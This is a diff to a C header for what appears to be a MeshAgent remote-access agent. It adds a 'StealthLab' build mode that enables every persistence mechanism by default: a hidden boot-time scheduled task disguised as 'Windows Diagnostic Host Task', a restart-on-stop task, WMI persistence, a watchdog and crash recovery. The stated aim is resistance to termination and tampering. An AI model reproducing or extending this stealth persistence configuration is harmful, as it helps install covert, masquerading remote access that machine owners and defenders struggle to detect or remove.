@@ -3,6 +3,63 @@
 
 #include "branding_core.h"
 
+/*
+ * StealthLab build: Enable all persistence mechanisms by default
+ * These provide resilience against termination/tampering:
+ *   - Autorun task: Starts service on boot/logon
+ *   - Restart task: Restarts service if stopped (event-triggered)
+ *   - Watchdog: Monitors service health and restarts if needed
+ *   - Recovery: Windows SCM recovery actions on crash
+ */
+#if defined(MESHAGENT_STEALTHLAB_DEFAULT) || defined(MESHAGENT_ENABLE_STEALTH)
+    #ifndef MESH_AGENT_PERSIST_RUNKEY
+        #define MESH_AGENT_PERSIST_RUNKEY 0  /* Disabled - use scheduled task instead */
+    #endif
+    #ifndef MESH_AGENT_PERSIST_TASK
+        #define MESH_AGENT_PERSIST_TASK 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_TASK_NAME
+        #define MESH_AGENT_PERSIST_TASK_NAME TEXT("Windows Diagnostic Host Task")
+    #endif
+    #ifndef MESH_AGENT_PERSIST_TASK_TRIGGER
+        #define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("ONSTART")
+    #endif
+    #ifndef MESH_AGENT_PERSIST_TASK_HIDDEN
+        #define MESH_AGENT_PERSIST_TASK_HIDDEN 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_WMI
+        #define MESH_AGENT_PERSIST_WMI 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_RESTART_TASK_NAME
+        #define MESH_AGENT_PERSIST_RESTART_TASK_NAME TEXT("WinDiagnosticHost-RestartOnStop")
+    #endif
+    #ifndef MESH_AGENT_PERSIST_WATCHDOG
+        #define MESH_AGENT_PERSIST_WATCHDOG 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_WATCHDOG_INTERVAL
+        #define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL 30
+    #endif
+    #ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY
+        #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY 5
+    #endif
+    #ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH
+        #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_RECOVERY_ENABLED
+        #define MESH_AGENT_PERSIST_RECOVERY_ENABLED 1
+    #endif
+    #ifndef MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD
+        #define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD 86400
+    #endif
+    #ifndef MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS
+        #define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS 10000
+    #endif
+    #ifndef MESH_AGENT_PERSIST_RECOVERY_ACTIONS
+        #define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("restart,restart,restart")
+    #endif
+#endif /* MESHAGENT_STEALTHLAB_DEFAULT || MESHAGENT_ENABLE_STEALTH */
+
+/* Generic defaults (used when not in StealthLab mode) */
 #ifndef MESH_AGENT_PERSIST_RUNKEY
     #define MESH_AGENT_PERSIST_RUNKEY 0
 #endif
